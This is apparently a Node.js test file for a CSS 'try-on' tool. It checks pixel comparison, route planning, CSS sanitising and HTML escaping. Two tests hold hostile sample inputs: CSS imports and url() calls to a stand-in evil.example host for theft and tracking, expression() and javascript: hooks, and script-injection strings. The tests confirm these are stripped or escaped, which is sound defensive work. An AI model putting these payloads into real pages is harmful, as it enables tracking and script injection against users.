import { test } from "node:test";
import assert from "node:assert/strict";
import path from "node:path";
import { sanitizeCss, tryonPlan, directionSlug, renderTryonHTML, boostRoot, pixelChange } from "../src/tryon.mjs";
import { encodePNG } from "../src/png.mjs";

test("try-on CSS outranks the page's own root rules, and its effect is measured in pixels", () => {
  assert.equal(boostRoot(":root { --bg: #fff } :root[data-theme='dark'] { --bg: #000 } :root-ish {}"), ":root:not(#uic) { --bg: #fff } :root:not(#uic)[data-theme='dark'] { --bg: #000 } :root-ish {}");
  const img = (fill, w = 10, h = 10) => encodePNG({ width: w, height: h, data: new Uint8Array(w * h * 4).fill(fill) });
  assert.equal(pixelChange(img(255), img(255)), 0);
  assert.equal(pixelChange(img(255), img(0)), 100);
  assert.equal(pixelChange(img(255), img(0, 5, 5)), null, "different sizes cannot be compared");
});

test("CSS from anywhere is made safe: no remote fetches but Google Fonts, no script hooks", () => {
  const hostile = [
    "@import url(https://evil.example/steal.css);",
    "@import 'https://fonts.googleapis.com/css2?family=Inter';",
    "body { background: url(https://evil.example/track.png?u=1); }",
    "h1 { font-family: Inter; src: url(https://fonts.gstatic.com/s/inter.woff2); }",
    ".icon { background-image: url('data:image/svg+xml;utf8,<svg/>'); }",
    "a { width: expression(alert(1)); behavior: url(x.htc); -moz-binding: url(x.xml); color: red; }",
    "b { background: url(javascript:alert(1)); }",
  ].join("\n");
  const safe = sanitizeCss(hostile);
  assert.ok(!safe.includes("evil.example"), safe);
  assert.ok(safe.includes("fonts.googleapis.com") && safe.includes("fonts.gstatic.com"), "Google Fonts stay");
  assert.ok(safe.includes("data:image/svg+xml"), "data URLs stay");
  // The legacy hooks are renamed to properties browsers ignore (x-behavior, x-binding).
  assert.ok(!/expression\s*\(/i.test(safe) && !/javascript:/i.test(safe) && !/-moz-binding\s*:/i.test(safe) && !/(^|[;{\s])behavior\s*:/i.test(safe));
  assert.ok(safe.includes("color: red"), "ordinary rules survive");
  assert.equal(sanitizeCss("x".repeat(30_000)).length, 20_000, "capped");
});

test("a try-on repeats the capture's resting pages, signed in where they were, without the variants", () => {
  const manifest = {
    viewports: { desktop: { width: 1 }, mobile: { width: 1 }, "reflow-320": { width: 320, a11yPreset: true } },
    shots: [
      { route: "/", path: "/", viewport: "desktop" },
      { route: "/ [menu]", path: "/", viewport: "desktop", scenario: "menu" },
      { route: "/account", path: "/account", viewport: "desktop", auth: true },
      { route: "/shop", path: "/shop", viewport: "desktop" },
      { route: "/faq", path: "/faq", viewport: "desktop" },
    ],
  };
  const plan = tryonPlan(manifest);
  assert.deepEqual(plan.routes, [{ path: "/", auth: false }, { path: "/account", auth: true }, { path: "/shop", auth: false }], "three resting pages by default");
  assert.deepEqual(Object.keys(plan.viewports), ["desktop", "mobile"]);
  assert.deepEqual(tryonPlan(manifest, ["/faq"]).routes, [{ path: "/faq", auth: false }]);
  assert.equal(directionSlug("Warm Neutrals!", 0), "tryon-warm-neutrals");
  assert.equal(directionSlug("", 2), "tryon-direction-3");
});

test("the gallery escapes everything the critic wrote", () => {
  const dir = path.resolve("out", "before");
  const page = {
    route: "/",
    viewport: "desktop",
    percent: 40.8,
    original: path.join(dir, "home.desktop.fold.png"),
    tried: path.resolve("out", "tryon-x", "home.desktop.fold.png"),
    judgement: { changed: ["<img onerror=x> background warmed"], serves_goal: "yes", verdict: "better", gains: ["warmer"], losses: [], notes: "" },
  };
  const html = renderTryonHTML(
    { label: "before", base: "https://x", goal: "<b>goal</b>", routes: ["/"], generatedAt: "t", pick: { best: "<i>x</i>", why: "warmer" }, directions: [{ name: "<script>x</script>", rationale: "a & b", css: "</style><script>alert(1)</script>", dir: path.resolve("out", "tryon-x"), pages: [page] }] },
    { viewports: { desktop: {} }, shots: [] },
    dir,
  );
  assert.ok(!html.includes("<script>x</script>") && !html.includes("</style><script>") && !html.includes("<img onerror"));
  assert.match(html, /&lt;script&gt;alert\(1\)&lt;\/script&gt;/);
  assert.match(html, /src="home\.desktop\.fold\.png"/);
  assert.match(html, /src="\.\.\/tryon-x\/home\.desktop\.fold\.png"/);
  assert.match(html, /40\.8% of the first screen changed/);
  assert.match(html, /Recommended: &lt;i&gt;x&lt;\/i&gt;/);
  assert.match(html, /<button class="theme"/, "light first with a dark toggle");
  const nothing = renderTryonHTML({ label: "b", base: "x", goal: "g", routes: [], generatedAt: "t", directions: [{ name: "n", rationale: "r", css: "", dir, pages: [], changedNothing: true }] }, { shots: [] }, dir);
  assert.match(nothing, /changed nothing on the first screens/);
});
